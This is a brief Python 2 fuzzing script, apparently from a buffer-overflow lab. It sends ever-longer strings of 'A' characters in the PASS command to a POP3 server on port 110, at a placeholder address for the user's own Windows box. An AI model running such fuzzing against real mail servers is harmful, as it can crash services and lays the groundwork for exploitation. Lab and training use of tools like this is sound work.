#python .pop3-fuzzer.py 
#use the above on the cli to run
import socket

buffer = ['A']
counter = 100
while len(buffer) <=30:
    buffer.append('A'*counter)
    counter = counter+200

for string in buffer:
    print "fuzzing PASS with %s bytes" % len(string)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(('IP_HERE', 110)) #PUT THE IP OF YOUR WINDOWS BOX IN THIS LINE
    s.recv(1025)
    s.send('USER test \r\n')
    s.recv(1024)
    s.send('PASS'+string+'\r\n')
    s.send('QUIT\r\n')
    s.close()
